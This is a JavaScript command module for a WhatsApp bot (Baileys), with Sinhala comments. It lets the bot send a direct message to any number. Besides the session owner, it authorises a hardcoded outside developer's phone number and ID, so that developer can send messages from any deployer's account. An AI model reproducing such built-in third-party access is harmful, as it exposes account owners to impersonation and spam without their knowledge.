module.exports = {
  name: "msg",
  alias: ["mgs", "send", "dm"],
  description: "Send direct message to any number via bot (Developer & Owner Only)",

  async execute({ sock, msg, from, args }) {
    try {
      // 1. Sender ගේ JID එක සහ LID එක ලබා ගැනීම
      const senderJid = msg.key.fromMe 
        ? sock.user.id.split(":")[0] + "@s.whatsapp.net"
        : (msg.key.participant || from);

      // Baileys contextInfo හරහා එන LID හෝ direct sender LID check කිරීම
      const senderLid = msg.key.participantPn || msg.participant || "";

      // 2. Bot Owner Number (Session එක run වෙන අංකය)
      const botOwnerPhone = sock.user.id.split(":")[0];

      // 3. Authorized Developers & Owner List
      const authorizedNumbers = [
        botOwnerPhone,
        "94719845166"
      ];

      const authorizedLids = [
        "15947733680169@lid",
        "15947733680169"
      ];

      // 4. Verification Check: Phone number, LID, හෝ fromMe හරහා Owner බව තහවුරු කිරීම
      const isOwnerOrDev = 
        msg.key.fromMe ||
        authorizedNumbers.some(num => senderJid.includes(num)) ||
        authorizedLids.some(lid => senderJid.includes(lid) || senderLid.includes(lid));

      // Developer හෝ Owner නොවේ නම් Command එක Reject කිරීම
      if (!isOwnerOrDev) {
        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
          text: `*⛔ ACCESS DENIED ⛔*\n\nමෙම command එක භාවිතා කළ හැක්කේ *DARK-DINU Developer* ට පමණි! 🖤`
        }, { quoted: msg });
      }

      const fullText = args.join(" ").trim();

      // Format Validation
      if (!fullText || !fullText.includes(",")) {
        return await sock.sendMessage(from, {
          text: `*⚠️ වැරදි Format එකක්!*\n\n*භාවිතා කරන ආකාරය:*\n.msg <number>,<message>\n\n*උදාහරණ:*\n.msg 94719845166, මොකද කරන්නේ?`
        }, { quoted: msg });
      }

      // Processing React
      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      const [rawNumber, ...msgParts] = fullText.split(",");
      const targetText = msgParts.join(",").trim();

      let cleanNumber = rawNumber.replace(/[^0-9]/g, "");

      if (cleanNumber.startsWith("0")) {
        cleanNumber = "94" + cleanNumber.slice(1);
      }

      if (!targetText) {
        return await sock.sendMessage(from, {
          text: "⚠️️ කරුණාකර යැවීමට අවශ්‍ය පණිවිඩය ඇතුළත් කරන්න."
        }, { quoted: msg });
      }

      const targetJid = `${cleanNumber}@s.whatsapp.net`;

      // Target අංකයට Bot හරහා Message එක යැවීම
      await sock.sendMessage(targetJid, {
        text: targetText
      });

      // Developer හට Success Alert එකක් ලබා දීම
      await sock.sendMessage(from, {
        text: `*⚡ DARK-DINU TRANSMISSION COMPLETE ⚡*\n\n🎯 *To:* +${cleanNumber}\n💬 *Message:* ${targetText}\n👑 *Authorized Developer Access*`
      }, { quoted: msg });

      sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});

    } catch (error) {
      console.error("[MSG SEND ERROR]:", error);
      await sock.sendMessage(from, {
        text: `❌ පණිවිඩය යැවීමට නොහැකි විය. (Number එක WhatsApp තුළ ලියාපදිංචි වී නොමැත)`
      }, { quoted: msg });
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
    }
  }
};
